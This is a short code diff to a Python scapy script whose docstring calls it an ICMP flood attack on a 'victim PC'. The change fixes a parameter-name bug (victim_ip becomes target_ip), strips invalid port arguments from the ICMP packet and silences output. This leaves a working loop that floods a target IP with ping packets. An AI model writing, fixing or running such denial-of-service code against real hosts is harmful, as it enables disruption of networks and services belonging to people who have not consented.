@@ -6,7 +6,7 @@ from scapy.all import *
 
 
 
-def ping(victim_ip, targetedPort, duration):
+def ping(target_ip, targetedPort, duration):
     """
      Ping victim PC performing a ICMP Flood Attack
      The ICMP Flood Attack Aglortihm is based on sending packets 
@@ -14,9 +14,9 @@ def ping(victim_ip, targetedPort, duration):
     """
     for _ in range(duration):
         ip = IP(dst=target_ip)
-        icmp = ICMP(sport=RandShort(), dport=targetedPort)
+        icmp = ICMP()
         pkg = ip/icmp
-        send(pkg)
+        send(pkg, verbose=0)
         
 
 if __name__ == "__main__":
